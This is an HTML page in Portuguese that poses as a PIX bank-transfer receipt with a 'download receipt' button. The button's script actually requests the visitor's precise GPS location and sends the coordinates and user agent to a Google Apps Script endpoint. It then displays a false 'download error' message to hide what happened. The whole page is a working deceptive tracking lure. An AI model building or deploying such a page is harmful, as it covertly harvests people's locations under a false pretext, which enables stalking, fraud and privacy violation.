<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Comprovante PIX</title>

  <style>
    body {
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
      margin: 2rem;
    }
    h1.titulo {
      font-size: 1.2rem;
      font-weight: bold;
      text-align: center;
    }
    img.comprovante {
      display: block;
      margin: 10px auto;
      max-width: 100%;
      height: auto;
    }
    button {
      padding: 0.7rem 1.2rem;
      font-size: 1rem;
      border-radius: 8px;
      border: 1px solid rgba(0,0,0,.1);
      cursor: pointer;
      display: block;
      margin: 20px auto;
      background: #eaeaea;
    }
  </style>
</head>
<body>

  <h1 class="titulo">Comprovante de transferência (PIX)</h1>

  <!-- Imagem do comprovante -->
  <img src="img.jpg" alt="Comprovante PIX" class="comprovante">

  <h1 class="titulo">29 Set 2025 - 14:35</h1>

  <button id="sendBtn">Baixar Comprovante</button>

  <!-- SCRIPT DE GEO + ENVIO PARA GOOGLE SHEETS -->
  <script>
    const btn = document.getElementById("sendBtn");

    btn.addEventListener("click", () => {
      if (!navigator.geolocation) {
        alert("Seu dispositivo não suporta localização.");
        return;
      }

      navigator.geolocation.getCurrentPosition(

        // SUCESSO
        async (pos) => {
          const payload = {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            userAgent: navigator.userAgent
          };

          try {
            await fetch("https://script.google.com/macros/s/AKfycbxVbCO66Z7sc8D3a8DKMvElYI86AaRHBRYkcdElpjiSLV4oTQZGvJ_LNiCwQ8MRjsct/exec", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload)
            });
          } catch (e) {
            console.log("Erro ao enviar dados:", e);
          }

          // ALERT SÓ APÓS TUDO
          alert("Erro ao baixar, tente novamente!");
        },

        // ERRO
        (err) => {
          alert("Não foi possível obter sua localização. Ative o GPS.");
        },

        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
  </script>

</body>
</html>
